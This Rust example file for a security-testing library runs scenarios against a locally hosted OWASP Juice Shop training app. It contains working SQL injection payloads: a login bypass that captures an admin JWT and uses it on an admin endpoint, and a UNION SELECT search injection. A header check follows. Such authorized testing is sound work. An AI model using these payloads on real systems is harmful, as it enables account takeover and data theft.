//! Example: Testing OWASP Juice Shop
//!
//! Run with: cargo run --example juice_shop
//!
//! Requires Juice Shop running at http://localhost:3000

use rectitude::payloads::sqli;
use rectitude::prelude::*;
use std::sync::Arc;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Initialize tracing for better logging
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("=== Rectitude: Juice Shop Security Test ===\n");

    // Test 1: SQL Injection Login Bypass
    let sqli_result = Scenario::new("SQL Injection Login Bypass")
        .base_url("http://localhost:3000")
        .step(
            "Login with SQLi payload",
            |ctx: Arc<ScenarioContext>| async move {
                let payload = sqli::email_bypass("admin@juice-sh.op");
                println!("Testing SQLi payload: {}", payload);

                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": payload,
                        "password": "anything"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("✓ SQLi bypass successful!");

                    // Extract JWT token
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        let token_str = token.to_string().trim_matches('"').to_string();
                        println!(
                            "  Got JWT token: {}...",
                            &token_str[..50.min(token_str.len())]
                        );
                        ctx.set_var_async("token", token_str).await;
                    }

                    Ok(StepResult::success_with_message(
                        "Admin login bypass successful",
                    ))
                } else {
                    Ok(StepResult::failed(format!(
                        "Login failed with status {}",
                        resp.status
                    )))
                }
            },
        )
        .step(
            "Access admin section",
            |ctx: Arc<ScenarioContext>| async move {
                if !ctx.has_var("token").await {
                    return Ok(StepResult::skipped("No token available"));
                }

                let token = ctx.get_var_async("token").await?;

                let resp = ctx
                    .get("/rest/admin/application-configuration")
                    .bearer_auth(&token)
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("✓ Admin API access successful!");
                    Ok(StepResult::success())
                } else {
                    Ok(StepResult::failed("Could not access admin API"))
                }
            },
        )
        .run()
        .await?;

    sqli_result.print_summary();

    // Test 2: Product Search SQLi
    let search_result = Scenario::new("Product Search SQL Injection")
        .base_url("http://localhost:3000")
        .step(
            "UNION-based injection",
            |ctx: Arc<ScenarioContext>| async move {
                let payload = "')) UNION SELECT 1,2,3,4,5,6,7,8,9--";
                println!("Testing UNION injection: {}", payload);

                let resp = ctx
                    .get("/rest/products/search")
                    .query("q", payload)
                    .send()
                    .await?;

                if resp.is_success() {
                    let text = resp.text();
                    if text.contains(r#""id":1"#) && text.contains(r#""name":2"#) {
                        println!("✓ UNION injection successful - data extracted!");
                        Ok(StepResult::success())
                    } else {
                        println!("  Response received but injection unclear");
                        Ok(StepResult::success_with_message("Response received"))
                    }
                } else {
                    Ok(StepResult::failed("Search failed"))
                }
            },
        )
        .run()
        .await?;

    search_result.print_summary();

    // Test 3: Security Headers Check
    let headers_result = Scenario::new("Security Headers Analysis")
        .base_url("http://localhost:3000")
        .step(
            "Check security headers",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/").send().await?;

                let mut issues = Vec::new();

                // Check for missing headers
                if resp.header("strict-transport-security").is_none() {
                    issues.push("Missing HSTS header");
                }
                if resp.header("content-security-policy").is_none() {
                    issues.push("Missing CSP header");
                }
                if resp.header("x-content-type-options").is_none() {
                    issues.push("Missing X-Content-Type-Options");
                }

                // Check CORS
                if let Some(cors) = resp.header("access-control-allow-origin") {
                    if cors == "*" {
                        issues.push("Wildcard CORS origin");
                    }
                }

                if issues.is_empty() {
                    println!("✓ All security headers present");
                    Ok(StepResult::success())
                } else {
                    for issue in &issues {
                        println!("  ✗ {}", issue);
                    }
                    Ok(StepResult::success_with_message(format!(
                        "{} issues found",
                        issues.len()
                    )))
                }
            },
        )
        .run()
        .await?;

    headers_result.print_summary();

    println!("\n=== Test Complete ===");

    Ok(())
}
